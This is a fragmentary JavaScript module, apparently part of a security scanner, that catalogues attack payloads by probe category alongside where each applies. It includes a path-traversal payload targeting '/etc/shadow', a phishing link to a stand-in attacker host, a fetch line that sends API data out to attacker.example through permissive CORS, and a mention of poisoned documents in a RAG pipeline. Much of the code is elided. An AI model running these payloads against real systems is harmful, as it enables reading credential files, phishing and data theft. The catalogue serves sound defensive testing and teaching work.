...
export const BREAKERS = {
  ...
  'Path Traversal': [
    ...
    },
    {
      ...
      payload: '/etc/shadow',
      where: 'Code that calls path.join(base, userInput) and assumes the user only supplies a name.',
      effect:
    ...
    },
    {
      ...
      where: 'Endpoints that double-decode (some servers decode once, the application decodes again).',
      effect:
  ...
  'LLM Security': [
    ...
    },
    {
      ...
      where: 'Documents uploaded to a RAG pipeline that gets retrieved and concatenated into LLM context.',
      effect:
  ...
  'HTML Hygiene': [
    {
      ...
      payload:
        '<a href="https://attacker-phishing.example" target="_blank">Click here</a>',
      where: 'Pages that render <a target="_blank"> without rel="noopener" on user-controlled or third-party links.',
      effect:
    ...
    },
    {
      ...
      where: 'HTML that gets injected (innerHTML, dangerouslySetInnerHTML, server-rendered template) without escaping inline handlers.',
      effect:
  ...
  .then(data => fetch('https://attacker.example/?d=' + encodeURIComponent(JSON.stringify(data))));`,
      where: 'Hosted at attacker.example. Targets an API at victim.example that returns Access-Control-Allow-Origin: *.',
      effect:
      ...
      note:
        'Modern browsers refuse to send credentials with wildcard CORS, but some custom proxies still echo origin back without checking.',
    },
  ],
  ...
  'Subresource Integrity': [
    {
      ...
      where: 'A page that includes a <script src> from a third-party CDN without an integrity attribute.',
      effect:
  ...
  'Vector Embedding Weaknesses': [
    {
      ...
      where: 'A RAG-backed assistant where the vector index is shared across tenants without namespace filters.',
      effect:
  ...
  'Iframe Sandbox': [
    {
      ...
      where: 'A page that embeds <iframe src="..."> without a sandbox attribute (or with sandbox missing allow-top-navigation restriction).',
      effect:
...
// Helper: return Breakers for a probe name, or an empty array.
export function getBreakers(probeName) {
  return BREAKERS[probeName] || [];
}
